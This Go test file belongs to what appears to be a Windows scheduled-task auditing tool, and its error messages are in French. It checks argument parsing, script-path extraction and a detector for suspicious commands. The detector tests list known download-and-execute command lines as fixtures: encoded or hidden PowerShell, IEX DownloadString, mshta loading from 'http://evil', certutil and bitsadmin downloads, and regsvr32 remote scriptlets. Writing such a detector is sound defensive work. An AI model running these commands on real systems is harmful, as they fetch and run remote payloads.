package tasks

import (
	"reflect"
	"testing"
)

func TestSplitArgs(t *testing.T) {
	got := SplitArgs(`-NoProfile -File "C:\My Scripts\run.ps1"  -x`)
	want := []string{"-NoProfile", "-File", `C:\My Scripts\run.ps1`, "-x"}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("%q", got)
	}
}

func TestScriptFromArgs(t *testing.T) {
	cases := []struct{ exe, args, want string }{
		{`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`, `-ExecutionPolicy Bypass -File "C:\Scripts\backup.ps1"`, `C:\Scripts\backup.ps1`},
		{"cmd.exe", `/c C:\Tools\job.bat`, `C:\Tools\job.bat`},
		{"wscript.exe", `"C:\x\a.vbs" //B`, `C:\x\a.vbs`},
		{`C:\Program Files\App\app.exe`, `C:\x\a.ps1`, ""},
		{"powershell.exe", `-Command Get-Date`, ""},
	}
	for _, c := range cases {
		if got := ScriptFromArgs(c.exe, c.args); got != c.want {
			t.Errorf("%s %s → %q, attendu %q", c.exe, c.args, got, c.want)
		}
	}
}

func TestResolveCandidates(t *testing.T) {
	got := ResolveCandidates("powershell", `C:\Windows`)
	if got[0] != `C:\Windows\System32\powershell.exe` {
		t.Errorf("%v", got)
	}
	if got := ResolveCandidates(`C:\x\y.exe`, `C:\Windows`); len(got) != 1 {
		t.Errorf("%v", got)
	}
}

func TestSuspicious(t *testing.T) {
	bad := []struct{ exe, args string }{
		{"powershell.exe", "-nop -w hidden -enc SQBFAFgA"},
		{"powershell.exe", "-EncodedCommand SQBFAFgA"},
		{"powershell.exe", "-WindowStyle Hidden -File x.ps1"},
		{"powershell.exe", "-c IEX (New-Object Net.WebClient).DownloadString('http://x')"},
		{"mshta.exe", "http://evil/x.hta"},
		{`C:\Windows\System32\rundll32.exe`, `javascript:"\..\mshtml,RunHTMLApplication"`},
		{"certutil.exe", "-urlcache -split -f http://x/a.exe a.exe"},
		{"bitsadmin.exe", "/transfer job http://x/a.exe C:\\a.exe"},
		{"cmd.exe", "/c powershell -enc AAAA"},
		{"regsvr32.exe", "/s /n /u /i:http://x/a.sct scrobj.dll"},
	}
	for _, c := range bad {
		if len(Suspicious(c.exe, c.args)) == 0 {
			t.Errorf("non détecté : %s %s", c.exe, c.args)
		}
	}
	good := []struct{ exe, args string }{
		{"powershell.exe", "-ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1"},
		{"powershell.exe", "-ep bypass -NoProfile -Command Get-Date"},
		{"rundll32.exe", "C:\\Windows\\system32\\Windows.Storage.ApplicationData.dll,CleanupTemporaryState"},
		{"certutil.exe", "-store my"},
		{"cmd.exe", "/c echo ok"},
		{`C:\Program Files\App\app.exe`, "-enc"},
	}
	for _, c := range good {
		if s := Suspicious(c.exe, c.args); len(s) != 0 {
			t.Errorf("faux positif : %s %s → %v", c.exe, c.args, s)
		}
	}
}

func TestRiskyLocation(t *testing.T) {
	if !RiskyLocation(`C:\Users\bob\AppData\Local\Temp\x.exe`, false) || !RiskyLocation(`C:\Users\Public\x.exe`, false) {
		t.Error("dossiers à risque")
	}
	if RiskyLocation(`C:\ProgramData\Vendor\x.exe`, false) || !RiskyLocation(`C:\ProgramData\Vendor\x.exe`, true) {
		t.Error("ProgramData")
	}
	if RiskyLocation(`C:\Program Files\x.exe`, true) {
		t.Error("Program Files")
	}
}
